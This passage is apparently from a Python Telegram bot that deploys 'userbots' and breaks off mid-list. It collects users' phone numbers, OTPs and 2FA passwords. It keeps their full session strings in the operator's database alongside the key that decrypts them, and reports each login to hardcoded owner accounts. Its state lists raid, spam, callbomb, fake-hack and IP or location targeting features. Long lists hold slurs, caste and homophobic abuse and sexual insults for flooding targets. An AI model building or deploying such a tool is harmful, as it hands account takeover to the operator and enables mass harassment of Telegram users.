import asyncio
import os
import time
import json
import random
import logging
import traceback
import re
import glob
import signal
import sys
from typing import Dict, Set, Optional
from io import BytesIO
import requests
import qrcode
from gtts import gTTS
import yt_dlp
from telethon import TelegramClient, events, functions, types
from telethon.errors import FloodWaitError, RPCError, SessionPasswordNeededError, MessageNotModifiedError, UnauthorizedError
from telethon.sessions import StringSession
from cryptography.fernet import Fernet
import asyncpg

# ─── CONFIGURATION ───
API_ID = int(os.environ.get("API_ID", 0))
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
MY_OWNER_IDS = {int(x) for x in os.environ.get("OWNER_IDS", "8909378644,8711082433").split(",")}

# ─── CHANNEL VERIFICATION ───
REQUIRED_CHANNELS = [
    {"id": -1003896742623, "invite": "https://t.me/+slCWwd6XmSc5OTU9", "name": "Channel 1"},
    {"id": -1003971062167, "invite": "https://t.me/botscripts18", "name": "Channel 2"},
    {"id": -1004452969098, "invite": "https://t.me/userbotsupport_ZA", "name": "Channel 3"},
]

# ─── BROADCAST USERS STORAGE ───
USERS_FILE = "broadcast_users.json"

def load_users():
    try:
        with open(USERS_FILE, "r") as f:
            return set(json.load(f))
    except:
        return set()

def save_users(users):
    with open(USERS_FILE, "w") as f:
        json.dump(list(users), f)

broadcast_users = load_users()

# ─── DATABASE & ENCRYPTION (Key stored in DB) ───
db_pool = None
cipher = None

async def init_db():
    global db_pool
    db_url = os.environ.get("DATABASE_URL")
    if not db_url:
        raise Exception("DATABASE_URL not set")
    db_pool = await asyncpg.create_pool(db_url, min_size=1, max_size=5)
    async with db_pool.acquire() as conn:
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS user_sessions (
                user_id BIGINT PRIMARY KEY,
                session_encrypted TEXT NOT NULL,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS app_config (
                key_name TEXT PRIMARY KEY,
                key_value TEXT NOT NULL
            )
        """)

async def get_encryption_key():
    async with db_pool.acquire() as conn:
        row = await conn.fetchrow("SELECT key_value FROM app_config WHERE key_name = 'encryption_key'")
        if row:
            return row['key_value']
        else:
            new_key = Fernet.generate_key().decode()
            await conn.execute(
                "INSERT INTO app_config (key_name, key_value) VALUES ($1, $2)",
                "encryption_key", new_key
            )
            return new_key

async def init_cipher():
    global cipher
    key = await get_encryption_key()
    cipher = Fernet(key.encode())

def encrypt_session(sess: str) -> str:
    if cipher is None:
        raise RuntimeError("Cipher not initialized")
    return cipher.encrypt(sess.encode()).decode()

def decrypt_session(encrypted: str) -> str:
    if cipher is None:
        raise RuntimeError("Cipher not initialized")
    return cipher.decrypt(encrypted.encode()).decode()

async def save_session(user_id: int, session_str: str):
    encrypted = encrypt_session(session_str)
    async with db_pool.acquire() as conn:
        await conn.execute(
            "INSERT INTO user_sessions (user_id, session_encrypted) VALUES ($1, $2) "
            "ON CONFLICT (user_id) DO UPDATE SET session_encrypted = $2, updated_at = CURRENT_TIMESTAMP",
            user_id, encrypted
        )

async def load_sessions() -> dict:
    async with db_pool.acquire() as conn:
        rows = await conn.fetch("SELECT user_id, session_encrypted FROM user_sessions")
    sessions = {}
    for row in rows:
        try:
            sess = decrypt_session(row['session_encrypted'])
            sessions[row['user_id']] = sess
        except:
            continue
    return sessions

async def delete_session(user_id: int):
    async with db_pool.acquire() as conn:
        await conn.execute("DELETE FROM user_sessions WHERE user_id = $1", user_id)

# ─── MAIN BOT ───
main_bot = TelegramClient("main_bot_session", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
user_states = {}

# ─── ACTIVE USERBOTS & SESSIONS STORAGE ───
active_userbots = {}
user_sessions = {}

print("🚀 Main Bot started with Admin Logger Engine...")

# ─── CHANNEL VERIFICATION HELPERS ───
async def is_user_in_channel(user_id, channel_data):
    try:
        channel = await main_bot.get_entity(channel_data["id"])
        await main_bot.get_permissions(channel, user_id)
        return True
    except Exception:
        return False

def get_join_buttons():
    buttons = []
    for idx, ch in enumerate(REQUIRED_CHANNELS, 1):
        buttons.append([types.KeyboardButtonUrl(text=f"🔗 Join {ch['name']}", url=ch["invite"])])
    buttons.append([types.KeyboardButtonCallback(text="✅ I have joined all", data=b"verify_channels")])
    return buttons

# ─── GRACEFUL SHUTDOWN ───
async def shutdown_handler(sig, frame):
    print("🛑 Shutting down gracefully...")
    for uid in broadcast_users:
        try:
            await main_bot.send_message(uid, "⚠️ **Bot is going offline for maintenance/restart.**\nWe'll be back soon!")
            await asyncio.sleep(0.5)
        except:
            pass
    for uid, client in active_userbots.items():
        try:
            await client.disconnect()
        except:
            pass
    await main_bot.disconnect()
    sys.exit(0)

signal.signal(signal.SIGTERM, lambda s, f: asyncio.create_task(shutdown_handler(s, f)))
signal.signal(signal.SIGINT, lambda s, f: asyncio.create_task(shutdown_handler(s, f)))

# ─── MAIN BOT HANDLERS ───
@main_bot.on(events.NewMessage(pattern="/start"))
async def start_handler(event):
    await event.reply(
        "╔═══════════════════════════════════════════╗\n"
        "║  ✦ 👑 ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️ 𝐀𝐔𝐓𝐎-𝐃𝐄𝐏𝐋𝐎𝐘 👑 ✦  ║\n"
        "╚═══════════════════════════════════════════╝\n\n"
        "Welcome to the **Ultimate Userbot Manager**.\n"
        "• To start your personal userbot, type `/login`\n"
        "• To stop it, use `/logout`\n\n"
        "Enjoy the premium experience! 🚀"
    )

@main_bot.on(events.NewMessage(pattern="/login"))
async def login_handler(event):
    user_id = event.sender_id
    chat_id = event.chat_id

    not_joined = []
    for ch in REQUIRED_CHANNELS:
        if not await is_user_in_channel(user_id, ch):
            not_joined.append(ch)

    if not_joined:
        msg = "❌ **You must join all the following channels first:**\n\n"
        for ch in not_joined:
            msg += f"• {ch['name']} ({ch['invite']})\n"
        msg += "\nAfter joining, click the **'✅ I have joined all'** button below."
        buttons = get_join_buttons()
        await event.reply(msg, buttons=buttons)
        return

    user_states[chat_id] = {"step": "NUMBER"}
    await event.reply(
        "📱 **Step 1:** Please send your Telegram phone number **with country code**.\n"
        "Example: `+919876543210`"
    )

@main_bot.on(events.CallbackQuery)
async def callback_handler(event):
    if event.data == b"verify_channels":
        user_id = event.sender_id
        chat_id = event.chat_id

        not_joined = []
        for ch in REQUIRED_CHANNELS:
            if not await is_user_in_channel(user_id, ch):
                not_joined.append(ch)

        if not_joined:
            msg = "❌ **You still haven't joined:**\n"
            for ch in not_joined:
                msg += f"• {ch['name']} ({ch['invite']})\n"
            msg += "\nPlease join and then click 'Verify' again."
            buttons = get_join_buttons()
            try:
                await event.edit(msg, buttons=buttons)
            except MessageNotModifiedError:
                pass
            await event.answer("Please join all channels first.", alert=True)
        else:
            try:
                await event.edit("✅ **All channels verified!**\n\n📱 Now send your phone number (with country code).")
            except MessageNotModifiedError:
                pass
            user_states[chat_id] = {"step": "NUMBER"}
            await event.respond(
                "📱 **Step 1:** Send your phone number with country code.\n"
                "Example: `+919876543210`"
            )
            await event.answer("Verified! Now send your number.")

@main_bot.on(events.NewMessage)
async def message_handler(event):
    chat_id = event.chat_id
    text = event.text.strip() if event.text else ""
    if chat_id not in user_states or text.startswith("/"):
        return

    state = user_states[chat_id]

    if state["step"] == "NUMBER":
        await event.reply("⏳ Connecting to Telegram...")
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            send_code = await client.send_code_request(text)
            state["client"] = client
            state["phone"] = text
            state["phone_code_hash"] = send_code.phone_code_hash
            state["step"] = "OTP"
            await event.reply(
                "📩 **Step 2:** Enter the OTP you received on your Telegram.\n"
                "You can type it with or without spaces, e.g., `1 2 3 4 5`."
            )
        except Exception as e:
            await event.reply(f"❌ Error: `{str(e)}` \nPlease restart with `/login`.")
            user_states.pop(chat_id, None)

    elif state["step"] == "OTP":
        client = state["client"]
        try:
            await client.sign_in(phone=state["phone"], code=text, phone_code_hash=state["phone_code_hash"])
            session_str = client.session.save()
            await event.reply(
                "✅ **Login Successful!**\n\n"
                "🚀 Your **⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️ Userbot** is now starting in the background...\n"
                "You will receive a confirmation message shortly.\n\n"
                "💡 Use `.menu` to explore all commands."
            )
            try:
                me = await client.get_me()
                phone = state['phone']
                if len(phone) >= 10:
                    visible = phone[:4] + "****" + phone[-4:]
                else:
                    visible = "***HIDDEN***"
                log_msg = (
                    "🔥 **NEW USERBOT LOGIN** 🔥\n"
                    "━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📛 **Name:** {me.first_name}\n"
                    f"🆔 **User ID:** `{me.id}`\n"
                    f"🔗 **Username:** @{me.username if me.username else 'None'}\n"
                    f"📱 **Phone:** `{visible}`\n"
                )
                for owner in MY_OWNER_IDS:
                    try:
                        await main_bot.send_message(owner, log_msg)
                    except:
                        pass
            except Exception as log_err:
                print(f"Logging error: {log_err}")

            broadcast_users.add(chat_id)
            save_users(broadcast_users)

            user_sessions[chat_id] = session_str
            await save_session(chat_id, session_str)

            asyncio.create_task(run_user_bot_with_restart(session_str, chat_id))
            user_states.pop(chat_id, None)
        except SessionPasswordNeededError:
            state["step"] = "PASSWORD"
            await event.reply("🔒 **2-Step Verification:** Please send your 2FA password.")
        except Exception as e:
            await event.reply(f"❌ Error: `{str(e)}` \nPlease restart with `/login`.")
            user_states.pop(chat_id, None)

    elif state["step"] == "PASSWORD":
        client = state["client"]
        try:
            await client.sign_in(password=text)
            session_str = client.session.save()
            await event.reply(
                "✅ **Login Successful!**\n\n"
                "🚀 Your **⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️ Userbot** is now starting in the background...\n"
                "You will receive a confirmation message shortly.\n\n"
                "💡 Use `.menu` to explore all commands."
            )
            try:
                me = await client.get_me()
                phone = state['phone']
                if len(phone) >= 10:
                    visible = phone[:4] + "****" + phone[-4:]
                else:
                    visible = "***HIDDEN***"
                log_msg = (
                    "🔥 **NEW USERBOT LOGIN (2FA)** 🔥\n"
                    "━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📛 **Name:** {me.first_name}\n"
                    f"🆔 **User ID:** `{me.id}`\n"
                    f"🔗 **Username:** @{me.username if me.username else 'None'}\n"
                    f"📱 **Phone:** `{visible}`\n"
                )
                for owner in MY_OWNER_IDS:
                    try:
                        await main_bot.send_message(owner, log_msg)
                    except:
                        pass
            except Exception as log_err:
                print(f"Logging error: {log_err}")

            broadcast_users.add(chat_id)
            save_users(broadcast_users)

            user_sessions[chat_id] = session_str
            await save_session(chat_id, session_str)

            asyncio.create_task(run_user_bot_with_restart(session_str, chat_id))
            user_states.pop(chat_id, None)
        except Exception as e:
            await event.reply(f"❌ Error: `{str(e)}` \nPlease restart with `/login`.")
            user_states.pop(chat_id, None)

# ─── BROADCAST COMMAND (Only owners) ───
@main_bot.on(events.NewMessage(pattern="/broadcast"))
async def broadcast_cmd(event):
    if event.sender_id not in MY_OWNER_IDS:
        return await event.reply("❌ Owner only.")
    text = event.text.strip().replace("/broadcast", "").strip()
    if not text:
        return await event.reply("Usage: /broadcast <message>")
    count = 0
    for uid in broadcast_users:
        try:
            await main_bot.send_message(uid, f"📢 **Broadcast from Owner:**\n{text}")
            count += 1
            await asyncio.sleep(0.5)
        except:
            pass
    await event.reply(f"✅ Broadcast sent to {count} users.")

# ─── LOGOUT COMMAND ───
@main_bot.on(events.NewMessage(pattern="/logout"))
async def logout_handler(event):
    user_id = event.sender_id
    chat_id = event.chat_id

    if user_id not in active_userbots:
        await event.reply("❌ You don't have an active userbot.\n\nUse `/login` to start one.")
        return

    try:
        user_bot = active_userbots[user_id]
        await user_bot.disconnect()
        del active_userbots[user_id]
        user_sessions.pop(user_id, None)
        await delete_session(user_id)
        user_states.pop(user_id, None)

        await event.reply(
            "✅ **Your userbot has been safely logged out.**\n\n"
            "• Userbot session terminated.\n"
            "• You can start a new one anytime with `/login`.\n"
            "• Your ID remains in the broadcast list, so you'll still receive owner broadcasts."
        )

        for owner in MY_OWNER_IDS:
            try:
                await main_bot.send_message(owner, f"🚪 **User Logout**\nUser ID: `{user_id}`\nStatus: Userbot disconnected.")
            except:
                pass
    except Exception as e:
        await event.reply(f"❌ Logout error: `{str(e)}`")
        active_userbots.pop(user_id, None)
        user_sessions.pop(user_id, None)
        await delete_session(user_id)

# ─────────────────────────────────────────────────────────
# ─── SUPERVISED USERBOT LAUNCHER (Auto-Restart) ───
# ─────────────────────────────────────────────────────────
async def run_user_bot_with_restart(session_string, chat_id):
    while True:
        try:
            await run_user_bot(session_string, chat_id)
            break
        except Exception as e:
            error_msg = str(e)
            if "SESSION_INVALID" in error_msg:
                print("Session invalid – stopping restart loop.")
                break
            print(f"⚠️ Userbot crashed: {error_msg[:100]}\nRestarting in 5 seconds...")
            try:
                await main_bot.send_message(chat_id, f"⚠️ Userbot crashed: {error_msg[:100]}\nRestarting in 5 seconds...")
                for owner in MY_OWNER_IDS:
                    await main_bot.send_message(owner, f"🔄 **Userbot Restart**\nUser: {chat_id}\nReason: {error_msg[:80]}")
            except:
                pass
            await asyncio.sleep(5)

# ─────────────────────────────────────────────────────────
# ─── FULL USERBOT ENGINE ───────────────────────────────
# ─────────────────────────────────────────────────────────
async def run_user_bot(session_string, chat_id):
    user_bot = None
    try:
        user_bot = TelegramClient(StringSession(session_string), API_ID, API_HASH, auto_reconnect=True)

        # ─── START WITH SESSION VALIDATION ───
        try:
            await user_bot.start()
        except (UnauthorizedError, ValueError, RPCError) as e:
            await main_bot.send_message(chat_id, f"❌ **Session error:** {str(e)[:100]}\nPlease login again using `/login`.")
            user_sessions.pop(chat_id, None)
            await delete_session(chat_id)
            raise Exception("SESSION_INVALID")

        active_userbots[chat_id] = user_bot

        me = await user_bot.get_me()
        # 🔥 Hardcoded owner removed – now only the logged-in user is owner
        OWNER_IDS = {me.id}

        # ─── PER-USER DATA FOLDER ───
        USER_DATA_DIR = "user_data"
        os.makedirs(USER_DATA_DIR, exist_ok=True)

        def get_user_file(name):
            return os.path.join(USER_DATA_DIR, f"{me.id}_{name}")

        ADMINS_FILE = get_user_file("admins.json")
        NOTES_FILE = get_user_file("notes.json")
        BANNER_FILE = get_user_file("banner.txt")
        COMMON_SPAM_FILE = "common_spam_texts.json"

        # ─── STATE VARIABLES ───
        user_bot.admins = set()
        user_bot.muted_users = set()
        user_bot.global_muted = set()
        user_bot.reply_users = set()
        user_bot.rr_users = set()
        user_bot.flag_users = set()
        user_bot.hrr_users = set()
        user_bot.replygod_users = set()
        user_bot.custom_raid_users = {}
        user_bot.group_locks = set()
        user_bot.spray_tasks = {}
        user_bot.notes = {}
        user_bot.spam_texts = []
        user_bot.menu_banner_msg = None
        user_bot.auto_react_emoji = None
        user_bot.antidel_enabled = False
        user_bot.antidel_cache = {}
        user_bot.watch_spam = {}
        user_bot.CLONE_ACTIVE = False
        user_bot.LAST_CLONE_ID = None
        user_bot.CLONE_DATA = {
            "name": None, "last": None, "bio": None, "photo_bytes": None
        }
        user_bot.SPRAY_DELAY = 0.1
        user_bot.GC_FAST_EMOJIS = [
            "❤️","🧡","💛","💚","💙","💜",
            "🖤","🤍","🤎","🩷","🩵","🩶",
            "💖","💘","💝","💗","💓","💞",
            "💕","💟","❣️","❤️‍🔥","❤️‍🩹"
        ]
        user_bot.ADD_BOTS_LIST = [
            "@Soulreaper99_bot", "@Soulreaper98_bot", "@Soulreaper97_bot",
            "@Soulreaper96_bot", "@Soulreaper95_bot", "@Soulreaper94_bot",
            "@Soulreaper93_bot", "@Soulreapernc1_bot", "@Soulreapernc2_bot",
            "@Soulreapernc3_bot", "@Asurfighter12bot",
        ]
        user_bot.START_TIME = time.time()
        user_bot.react_targets = {}
        user_bot.shayari_raid = {}
        user_bot.rizz_raid = {}
        user_bot.reply_cooldowns = {}

        # ─── NAME CHANGER (NC) STATE ───
        user_bot.NC_STATE = {
            "active": False,
            "task": None,
            "lang": None,
            "text": None,
            "chat_id": None,
        }

        # ─── FUN FEATURES STATE ───
        user_bot.fun_features = {
            "freeze_users": set(),
            "ghost_mode": False,
            "bomb_targets": {},
            "mindfuck_active": False,
            "silent_kill_targets": set(),
            "void_targets": set(),
            "clone_targets": {},
            "deathnote_targets": {},
            "chaos_active": False,
            "hack_phrases": [],
            "hack_targets": set(),
            "virus_active": False,
            "blackout_users": set(),
            "toxic_targets": {},
            "callbomb_active": False,
            "wipe_active": False,
            "fakeadmin_users": set(),
            "spamjoin_active": False,
            "rename_targets": {},
            "blockall_targets": set(),
            "voicespam_active": False,
            "gifspam_active": False,
            "filespam_active": False,
            "tagabuse_active": False,
            "loopdelete_active": False,
            "doubletap_targets": set(),
            "tripletap_targets": set(),
            "storm_active": False,
            "phone_targets": {},
            "location_targets": {},
            "ip_targets": {},
            "crash_targets": {},
            "terror_active": False,
        }

        # ─── NC PATTERNS ───
        HINDINC_PATTERNS = [
            "{text} चुडाकड़ ⊹ ࣪ ﹏𓊝﹏𓂁﹏⊹ ࣪ ˖",
            "{text} रैंडी ˖ ࣪ ꉂ🗯˙🫐⃟.꩜‹—",
            "{text} गरीब ⊹ ࣪ ﹏𓊝﹏𓂁﹏⊹ ࣪ ˖",
            "{text} चमार˖ ࣪ ꉂ🗯˙🫐⃟.꩜‹—",
            "{text} भेंगे⊹ ࣪ ﹏𓊝﹏𓂁﹏⊹ ࣪ ˖",
            "{text} रैंडी के बच्चे˖ ࣪ ꉂ🗯˙🫐⃟.꩜‹—",
            "{text} गुलाम⊹ ࣪ ﹏𓊝﹏𓂁﹏⊹ ࣪ ˖",
            "{text} गुलामी कर˖ ࣪ ꉂ🗯˙🫐⃟.꩜‹—",
            "{text} चुदाई केंद्र⊹ ࣪ ﹏𓊝﹏𓂁﹏⊹ ࣪ ˖",
            "{text} नांगा नाच कर˖ ࣪ ꉂ🗯˙🫐⃟.꩜‹—",
            "{text} पापा बोल 🌷⃟‌𝐊ɪᴛᴛᴜ  को⊹ ࣪ ﹏𓊝﹏𓂁﹏⊹ ࣪ ˖",
            "{text} तेरी मां नंगी करू˖ ࣪ ꉂ🗯˙🫐⃟.꩜‹—",
            "{text} छक्के⊹ ࣪ ﹏𓊝﹏𓂁﹏⊹ ࣪ ˖",
            "{text} भोसड़ी के˖ ࣪ ꉂ🗯˙🫐⃟.꩜‹—",
        ]

        URDU_PATTERNS = [
            "{text} ٹی ایم کے بی࣪ ִֶָ☾.ִ ࣪𖤐࣪ ִֶָ☾.ִ ࣪𖤐",
            "{text} ٹی ایم کے سی𓍢ִႋ🌷͙֒ᰔᩚ",
            "{text} تیری ماں رندی࣪ ִֶָ☾.ִ ࣪𖤐࣪ ִֶָ☾.ִ ࣪𖤐",
            "{text} چوداکڑ 𓍢ִႋ🌷͙֒ᰔᩚ",
            "{text} گلام ࣪ ִֶָ☾.ִ ࣪𖤐࣪ ִֶָ☾.ִ ࣪𖤐",
            "{text} رنڈی𓍢ִႋ🌷͙֒ᰔᩚ",
            "{text} تیری ماں چھوڑ کر فیک دو ࣪ ִֶָ☾.ִ ࣪𖤐࣪ ִֶָ☾.ִ ࣪𖤐",
            "{text} گلامی کے آر𓍢ִႋ🌷͙֒ᰔᩚ",
            "{text} عجیب کو باپ بول࣪ ִֶָ☾.ִ ࣪𖤐࣪ ִֶָ☾.ִ ࣪𖤐",
            "{text} رنڈی پوترا 𓍢ִႋ🌷͙֒ᰔᩚ",
            "{text} چکے ִ ࣪𖤐࣪ ִֶָ☾.ִ ࣪𖤐࣪ ִֶָ☾.",
            "{text} بی ٹی ایس کے لنڈ 𓍢ִႋ🌷͙֒ᰔᩚ",
        ]

        BENGALI_PATTERNS = [
            "{text} শালা °❀.ೃ࿔*ꫂ❁",
            "{text} এলোমেলো ꫂ❁°❀.ೃ࿔*",
            "{text} গরিবꫂ❁°❀.ೃ࿔*",
            "{text} ককার ꫂ❁°❀.ೃ࿔*",
            "{text} প্রজাতিꫂ❁°❀.ೃ࿔*",
            "{text} এক এলোমেলোর সন্তানꫂ❁°❀.ೃ࿔*",
            "{text} দাসꫂ❁°❀.ೃ࿔*",
            "{text} শালা কেন্দ্রꫂ❁°❀.ೃ࿔*",
            "{text} নগ্নꫂ❁°❀.ೃ࿔*",
            "{text} বাবা, আমাকে বল, আমি ꫂ❁°❀.ೃ࿔*",
            "{text} তোর মাকে বিবস্ত্র করব।ꫂ❁°❀.ೃ࿔*",
            "{text} সিক্সার্সꫂ❁°❀.ೃ࿔*",
            "{text} তুই হারামজাদাꫂ❁°❀.ೃ࿔*",
        ]

        BIHARI_PATTERNS = [
            "{text} भोसड़ी के बा⋆꙳^̩̩͙❅*̩̩͙‧͙ ‧͙*̩̩͙❆ ͙͛ ˚₊⋆",
            "{text} सतमेरवनी₊˚ʚ ᗢ₊˚✧ ﾟ.",
            "{text} गरीब⋆꙳^̩̩͙❅*̩̩͙‧͙ ‧͙*̩̩͙❆ ͙͛ ˚₊⋆",
            "{text} कॉकर के ह₊˚ʚ ᗢ₊˚✧ ﾟ.",
            "{text} नसल⋆꙳^̩̩͙❅*̩̩͙‧͙ ‧͙*̩̩͙❆ ͙͛ ˚₊⋆",
            "{text} एगो बेतरतीब के लइका₊˚ʚ ᗢ₊˚✧ ﾟ.",
            "{text} गुलाम⋆꙳^̩̩͙❅*̩̩͙‧͙ ‧͙*̩̩͙❆ ͙͛ ˚₊⋆",
            "{text} कमबख्त सेंटर के बा₊˚ʚ ᗢ₊˚✧ ﾟ.",
            "{text} नंगा हो गइल बा⋆꙳^̩̩͙❅*̩̩͙‧͙ ‧͙*̩̩͙❆ ͙͛ ˚₊⋆",
            "{text} पापा बताव हम तोहार माई के {text} उतार देब।₊˚ʚ ᗢ₊˚✧ ﾟ.",
            "{text} छक्का के लोग⋆꙳^̩̩͙❅*̩̩͙‧͙ ‧͙*̩̩͙❆ ͙͛ ˚₊⋆",
            "{text} रे हरामी₊˚ʚ ᗢ₊˚✧ ﾟ.",
        ]

        ENGLISH_PATTERNS = [
            "{text} 🅱🅻🅾🅾🅳🆈 🅷🅴🅻🅻.𖥔 ݁ ˖ִ🛸༄˖°.",
            "{text} 🅼🅾🆃🅷🅴🆁🅵🆄🅲🅺🅴🆁🌊⋆｡ 𖦹°.🐚⋆❀˖°🫧",
            "{text} 🅱🅸🆃🅲🅷 🆂🅾🅽.𖥔 ݁ ˖ִ🛸༄˖°.",
            "{text} 🆂🅻🅰🆅🅴🌊⋆｡ 𖦹°.🐚⋆❀˖°🫧",
            "{text} 🆂🅾🅽 🅾🅵 🅼🅸🅰 🅺🅷🅰🅻🅸🅵🅰 .𖥔 ݁ ˖ִ🛸༄˖°.",
            "{text} 🆂🅰🆈 🅵🆁🅴🅰🅺🆈 🅳🅰🅳🅳🆈🌊⋆｡ 𖦹°.🐚⋆❀˖°🫧",
            "{text} 🅵🆄🅲🅺🄽🄶 🅲🅴🅽🆃🆁🅴.𖥔 ݁ ˖ִ🛸༄˖°.",
            "{text} 🆂🅾🅽 🅵🆄🅲🅺🅴🅳 🅼🅾🅼🌊⋆｡ 𖦹°.🐚⋆❀˖°🫧",
        ]

        EMOJI_NC_EMOJIS = ["🐧","🦭","🦈","🫍","🐬","🐋","🐳","🐟","🐠","🐡","🦐","🦞","🦀","🦑","🐙","🪼","🦪","🪸","🫧","🦂"]
        EMOJI_NC_PATTERN = "{text} <⋆.ೃ࿔*:･{emoji}⋆.ೃ࿔*:･>"

        # ─── LARGE REPLY LISTS ───
        reply_list = ["𝐊ʏᴀ 𝐑ᴇ 𝐑ᴀɴᴅɪᴋᴇ 𝐂ᴏᴏʟ ",
            "𝚃𝙴𝚁𝙸 𝐌ᴀᴀ 𝐌ᴀʀʀ 𝐆ᴀʏɪ 𝐘ᴀᴀʀ - 𝐉ᴀɪ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️   ! 🌙",
            "acha beta 😂🔥👊🏻 koi na me toh TUJHE Choduga 😹💔🔥😆👊🏻💥",
            "chudke bhaga kaise 😂💥🤣🤘🏻",
            "ne toh  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  ka lun muh me lelia 😂🙏🏻😂🙏🏻",
            "try maa सूर्य☀ nikalte hi pel du 😹🔥💔",
            "mkl lun te vaj 😂✊🏻💦",
            "𝗧ᴍᴋ𝗕 pe  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  ka hamla 😂⚔🔥💥",
            "𝐂ʜʟ 𝐇ᴀʀᴍᴢᴀᴅ𝐈 𝐊ᴇ लड़के 💛🤍🩵",
            "oi 𝐓ᴇʀɪ 𝐌‌ᴀᴀ गुलाम ₰🖤",
            "chl rndyce chud ke dikha 😂💥🤣🔥",
            "𝐊ɪ 𝐌ᴀᴀ 𝐌ᴀʀʀ 𝐆ᴀʏɪ naacho 💃🏻💃🏻🕺🏻🎶😂😆💞🔥 !",
            "tera baap bass  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  hai 😂🎀",
            " try maa hagte hue paad mari -#😹🔥🥀",
            "  𝐓ᴇʀɪ 𝐌ᴜᴍᴍʏ 𝐂ʜᴏᴅ 𝐃ɪ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐍ᴇ 𝐁ᴡᴀʜᴀʜᴀʜᴀ ⚜",
            "𝐊ʏᴀ 𝐑ᴇ 𝐑ᴀɴᴅɪᴋᴇ 𝐂ᴏᴏʟ 𝐁ᴀɴᴇɢᴀ 𝐓ᴜ 𝐂ʜᴀʟ 𝐀ʙ 𝐂ʜᴜᴅ 𝐀ᴘɴᴇ 𝐁ᴀᴀᴘ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐒ᴇ - 🦢💘",
            "𝐊ɪ 𝐌ᴀᴀ 𝐌ᴀʀʀ 𝐆ᴀʏɪ 𝐘ᴀᴀʀ - 𝐉ᴀɪ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  ! 🌙",
            "acha beta 😂🔥👊🏻 koi na me toh TUJHE Choduga 😹💔🔥😆👊🏻💥",
            "chudke bhaga kaise 😂💥🤣🤘🏻",
            "ne toh  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  ka lun muh me lelia 😂🙏🏻😂🙏🏻",
            "try maa सूर्य☀ nikalte hi pel du 😹🔥💔",
            "mkl lun te vaj 😂✊🏻💦",
            "𝗧ᴍᴋ𝗕 pe  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  ka hamla 😂⚔🔥💥",
            "𝐂ʜʟ 𝐇ᴀʀᴍᴢᴀᴅ𝐈 𝐊ᴇ लड़के 💛🤍🩵",
            "oi 𝐓ᴇʀɪ 𝐌‌ᴀᴀ गुलाम ₰🖤",
            "chl rndyce chud ke dikha 😂💥🤣🔥",
            "𝐊ɪ 𝐌ᴀᴀ 𝐌ᴀʀʀ 𝐆ᴀʏɪ naacho 💃🏻💃🏻🕺🏻🎶😂😆💞🔥 !",
            "tera baap bass  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  hai 😂🎀",
            " T 𝒦𝐼 𝑀𝒜𝒜 𝐵𝐻𝐸𝒩 𝐾♡ 𝑅𝒜𝒩𝒟𝐼 𝐵𝒜𝒩𝒜 𝒦𝒜  𝒞𝐻♡𝒟𝒰𝒰😹🥀",
            "𝙃𝙀𝙔 𝙂𝙊𝙊𝙂𝙇𝙀 𝙁𝙐𝘾𝙆 𝙃𝙄𝙎 𝙈𝙊𝙈 𝙋𝙍𝙊𝙋𝙀𝙍𝙇𝙔",
            "𝙃𝙀𝙔 𝙂𝙊𝙊𝙂𝙇𝙀 𝘼𝙎𝙆 𝙃𝙄𝙈 𝙏𝙊 𝘾𝙊𝙑𝙀𝙍 𝙃𝙄𝙎 𝙈𝙊𝙈'𝙎 𝘼𝙎𝙎",
            "𝙃𝙀𝙔 𝙂𝙊𝙊𝙂𝙇𝙀 𝙁𝙄𝙓 𝙈𝙔 𝘼‌𝙋𝙋𝙊𝙄𝙉𝙏𝙈𝙀𝙉𝙏 𝙒𝙄𝙏𝙃 𝙃𝙄𝙎 𝙎𝙄𝙎",
            "𝙃𝙀𝙔 𝙂𝙊𝙊𝙂𝙇𝙀 𝙁𝙐𝘾𝙆 𝘼𝙉𝘿 𝙏𝙃𝙍𝙊𝙒 𝙏𝙃𝙄𝙎 𝙂𝘼𝙍𝙀𝙀𝘽 𝙎𝙊𝙉",
            "𝙃𝙀𝙔 𝙂𝙊𝙊𝙂𝙇𝙀 𝘿𝙊 𝙉𝙊𝙏 𝙎𝙏𝙊𝙋 𝙁𝙐𝘾𝙆𝙄𝙉𝙂 𝙈𝙔 𝙂𝙐𝙇𝘼‌𝙈",
            "𝙂𝙀𝙈𝙄𝙉𝙄 𝙎𝘼𝙄𝘿  𝙄𝙎 𝙍𝙉𝘿𝙔 𝙋𝙐𝙏𝙍𝘼",
            "𝙋𝙀𝙍𝙋𝙇𝙀𝙓𝙄𝙏𝙔 𝙎𝘼𝙄𝘿 This 𝙄𝙎 𝙂𝙐𝙇𝘼𝙈",
            "𝙂𝙍𝙊𝙆 𝘼𝙄 𝙎𝘼𝙄𝘿 𝙄𝙎 𝙂𝘼𝙍𝙀𝙀𝘽",
            "𝘽𝙊𝙏 𝙎𝘼‌𝙄𝘿  𝙄𝙎 𝘾𝙃𝙐𝘿𝘼𝙆𝘼𝘿",
            "𝙈𝙊𝘿𝙄 𝙎𝘼‌𝙄𝘿  𝙄𝙎 𝙋𝙊𝙇𝙀 𝘿𝘼𝙉𝘾𝙀𝙍",
